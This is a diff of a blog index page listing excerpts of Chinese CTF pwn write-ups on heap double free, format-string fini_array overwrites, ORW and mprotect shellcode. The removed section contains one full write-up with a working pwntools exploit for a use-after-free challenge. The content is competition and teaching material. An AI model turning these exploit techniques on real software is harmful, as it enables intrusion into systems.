@@ -156,6 +156,407 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ciscn_2019_sw_1（fmt改fini_array无限循环）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://img-blog.csdnimg.cn/20210430231823107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">很明显的格式化漏洞，但是printf只能用一次<br>我们可以修改fini_array<br><img src="https://img-blog.csdnimg.cn/20210430232158289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">简单地说，在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。<br>而我们的目标就是修改.fini_array数组的第一个元素为start或者main函数地址。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。
+        
+          <a class="article-more-a" href="/2021/08/09/ciscn_2019_sw_1%EF%BC%88fmt%E6%94%B9fini_array%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF%EF%BC%89/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/ciscn_2019_sw_1%EF%BC%88fmt%E6%94%B9fini_array%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF%EF%BC%89/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-宁波第四次网络安全大赛之heap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>放到ida里一看是个经典的菜单题，先进delete看看，果然有个uaf，可以double free，但是这是个2.31的题目，趁这个机会学习一下2.31的df<br>这里的add和edit是同时进行的，并且只能申请0x70大小的堆，这给我们带来了不小的麻烦。一开始我本来想free tca改变count的，但是libc正好吧0x80的count覆盖了，导致我申请不了堆，所以这个题只能构造larger bins<br>首先2.31的tca已经不能直接free 1-&gt;2-&gt;1这样df了，所以我们先把tca填满，到fastbin里进行df<br><img src="https://img-blog.csdnimg.cn/20210526105348318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">泄露出heap的地址，进行df，我们把tca清空，申请堆，会使fast链进入tca中，进行tac dup，构造large bins 泄露libc，让后就是简单的malloc或者free_hook了
+        
+          <a class="article-more-a" href="/2021/08/09/%E5%AE%81%E6%B3%A2%E7%AC%AC%E5%9B%9B%E6%AC%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E4%B9%8Bheap/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/%E5%AE%81%E6%B3%A2%E7%AC%AC%E5%9B%9B%E6%AC%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E4%B9%8Bheap/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-silverwolf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这个题和看起来像lonewolf，但有沙盒规则，题目给了flag的位置，很显然是用orw来做题，我们先泄露出libc基值，rop中我们注入gadget来进行栈迁移，我们这里利用利用 setcontext 来控制rsp</p>
+        
+          <a class="article-more-a" href="/2021/08/09/silverwolf/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/silverwolf/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-2021-06-05" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>姓名：武家乐<br>ID：wondermaker<br><img src="https://img-blog.csdnimg.cn/2021060518042142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分数难看，比起re和web我的分数少的可怜</p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p><img src="https://img-blog.csdnimg.cn/20210605175017542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里的v4就是cancry，</p>
+        
+          <a class="article-more-a" href="/2021/08/09/2021-06-05/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/2021-06-05/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-2017 0ctf babyheap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>之前学习了一下lager bins的构建，今天来学习一下堆重叠和堆扩展<br>先找漏洞点<br><img src="https://img-blog.csdnimg.cn/59da792fd1a64590b04589fe0feea865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里没有对大小进行检查，可以输入任意字节，存在字节溢出<br>此题的难点在于如何泄露libc，由于add使用calloc的原因，当堆块从bins中拿出来时，会清空堆块<br>很明显我们要申请大的堆块进入unsorted bins来使main_aren+88写在堆块上，我们可以使上一个堆块扩展到这个堆块上来进行泄露<br>先贴上exp</p>
+        
+          <a class="article-more-a" href="/2021/08/09/2017%200ctf%20babyheap/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/09/2017%200ctf%20babyheap/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-(Jarvis Oj)level5的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>题目描述：mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。附件和level3_x64的附件一样。<br>首先去看看这个mmap函数和mprotect函数是干啥的。<br>void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)<br>int mprotect(void* addr, size_t len, int port)<br>简单来说mmap函数创建一块内存区域，将一个文件映射到该区域，进程可以像操作内存一样操作文件。mprotect函数可以改变一块内存区域的权限(以页为单位)。至于mmap函数没有想到怎么去利用，而mprotect函数是可以改变一个段的权限的，可以利用这一特点将bss段改为可执行，将shellcode写到bss段，再想办法执行即可。<br>首先，要使用mprotect函数，依然需要知道它在内存中的地址，通过level3的方法可以得到。<br>需要调用这个mprotect函数，我们发现它有三个参数，第一个是要设置的地址(edi)，第二个是设置的长度(esi)，第三个是权限值(edx)，但是我们在level3中发现简单的gadgets并没有pop edx，这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)。</p>
+        
+          <a class="article-more-a" href="/2021/03/17/(Jarvis%20Oj)level5%E7%9A%84wp/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/17/(Jarvis%20Oj)level5%E7%9A%84wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-[BUUCTF]PWN——[V&amp;N2020 公开赛]babybabypwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://img-blog.csdnimg.cn/20210313162434119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>沙盒规则，具体来说就是限制了了execve（系统调用），那么就只能用 open，read，write来获得flag。
+        
+          <a class="article-more-a" href="/2021/03/13/%5BBUUCTF%5DPWN%E2%80%94%E2%80%94%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5Dbabybabypwn/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/13/%5BBUUCTF%5DPWN%E2%80%94%E2%80%94%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5Dbabybabypwn/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-gyctf_2020_borrowstack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://img-blog.csdnimg.cn/20210310221203993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题一看，好像是个栈迁移
+        
+          <a class="article-more-a" href="/2021/03/10/gyctf_2020_borrowstack/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/10/gyctf_2020_borrowstack/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-roarctf_2019_easy_pwn的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -256,415 +657,9 @@
 
 
   
-    <article id="post-[ZJCTF 2019]Login的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>先运行，输入admin和2jctf_pa5sw0rd， 发现报错，gdb开始调试<br><img src="https://img-blog.csdnimg.cn/20210305230949723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入ida看看
-        
-          <a class="article-more-a" href="/2021/03/05/%5BZJCTF%202019%5DLogin%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/05/%5BZJCTF%202019%5DLogin%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-babyfengshui_33c3_2016的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这是个相当好的堆题<br>add函数<br><img src="https://img-blog.csdnimg.cn/20210305193619435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出这是个结构体
-        
-          <a class="article-more-a" href="/2021/03/05/babyfengshui_33c3_2016%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/05/babyfengshui_33c3_2016%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-[BJDCTF 2nd]ydsneedgirlfriend2的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这是一道堆题<br>add函数<br><img src="https://img-blog.csdnimg.cn/202102241926![%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0](https://img-blog.csdnimg.cn/20210224192650387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<!--moer-->del函数
-<p>可以看到的就是，这里虽然把两个chunk的free掉了，但是bss段那个指向chunk00的指针并没有置为null，这里就有机会了<br><img src="https://img-blog.csdnimg.cn/20210224192704344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>show函数<br>show函数实现的就是通过0x603018处存的print girlfriend name函数的地址，调用这个函数，输出chunk的内容。这里我们可以利用一下，如果能够把这个地址改成我们想要的地址，再调用show函数，就可以getshell了<br><img src="https://img-blog.csdnimg.cn/20210224192738216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>这里看看bss段<br><img src="https://img-blog.csdnimg.cn/20210224193023195.png" alt="在这里插入图片描述"><br>0x603010处存放着chunk0的地址，0x603018处存放的是print girlfriend name函数的</p>
-<p>地址，0x603020-0x603030处是chunk0的头部，0x603030处即为输入的”aaaa”</p>
-<p>这个时候，这两个chunk其实都是处于free状态的，这两个chunk是通过单链表的结构来管理的，后free的chunk放在表头，由于chunk00是后free的，所以放在表头，0x603010处存放的数据从0x603030变成了0x603020，即指向chunk0的头部</p>
-<p>当我们再次申请时，系统会寻找符合大小的chunk。而如果我们这时要一个0x20大小的chunk，它就会依次寻找，而表头chunk00正好是符合的，我们可以通过这一点控制0x603018处的函数指针</p>
-<p>add函数只会进行一次malloc，我们就可以把0x603018处的指针修改为backdoor函数地址，然后执行show函数，通过bss段存放的指针，就可以实现执行backdoor函数了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28087</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please input the length of her name:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please tell me her name:\n&#x27;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;choice :\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x400d86</span>)</span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/24/%5BBJDCTF%202nd%5Dydsneedgirlfriend2%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-[BJDCTF 2nd]r2t4的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="https://img-blog.csdnimg.cn/202102221642132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一看这是个格式化字符串漏洞
-        
-          <a class="article-more-a" href="/2021/02/22/%5BBJDCTF%202nd%5Dr2t4%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/22/%5BBJDCTF%202nd%5Dr2t4%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-[Black Watch 入群题]PWN之栈迁移" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="https://img-blog.csdnimg.cn/20210222155550983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进去康康函数结构
-        
-          <a class="article-more-a" href="/2021/02/22/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN%E4%B9%8B%E6%A0%88%E8%BF%81%E7%A7%BB/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/22/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN%E4%B9%8B%E6%A0%88%E8%BF%81%E7%A7%BB/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ciscn_2019_s_3的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这是一道新颖的题<br>64位程序看看vuln函数的汇编<br><img src="https://img-blog.csdnimg.cn/202102151602184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>看来利用了系统调用</strong>
-        
-          <a class="article-more-a" href="/2021/02/20/ciscn_2019_s_3%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/20/ciscn_2019_s_3%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ez_pz_hackover_2016的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="https://img-blog.csdnimg.cn/20210215220605789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-        
-          <a class="article-more-a" href="/2021/02/20/ez_pz_hackover_2016%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/20/ez_pz_hackover_2016%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ciscn_2019_es_2的wp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
